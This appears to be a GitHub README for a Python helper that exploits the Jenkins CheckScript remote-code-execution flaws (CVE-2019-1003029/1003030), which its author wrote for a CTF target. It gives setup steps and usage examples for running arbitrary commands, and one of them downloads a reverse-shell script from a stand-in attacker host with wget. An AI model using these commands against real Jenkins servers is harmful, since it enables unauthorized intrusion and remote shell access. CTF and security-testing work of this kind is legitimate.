Jenkins Checkscript RCE Helper
==============================


## Purpose

This little helper script was written because I got tired of copy/pasting commands into really long curl statements endlessly during my initial analysis of a CTF Jenkins target.

The official vulnerabilities for this exploitation:

* CheckScript RCE in Jenkins - CVE-2019-1003029, CVE-2019-1003030

_Features:_

* Automatically retrieve a current Jenkins-Crumb and use it in command execution requests
* Run commands with debugging functionality already enabled. In my case, there was no output returned without it.
* No more copy/pasting into curl!


Keep in mind, this only gets you foothold on the box as the user running the Jenkins service, it doesn't guarantee root. So, you'll still need to privesc once you are on.


## Setup

```bash
git clone https://github.com/Cashiuus/jenkins-checkscript-rce
cd jenkins-checkscript-rce
pip install -r requirements.txt
```


## Usage



```bash
./jenkins-checkscript-poc.py <URL> -c <arbitrary_command>

./jenkins-checkscript-poc.py "http://target:8080" -c id
./jenkins-checkscript-poc.py "http://target:8080" -c pwd
./jenkins-checkscript-poc.py "http://target:8080" -c wget http://attacker/revshell.sh -O revshell.sh
./jenkins-checkscript-poc.py "http://target:8080" -c ls -al /home/

```


## Credit

    * Much thanks for the incredible collection of background research: https://github.com/gquere/pwn_jenkins

    * Jenkins Advisory: https://www.jenkins.io/security/advisory/2019-03-06/
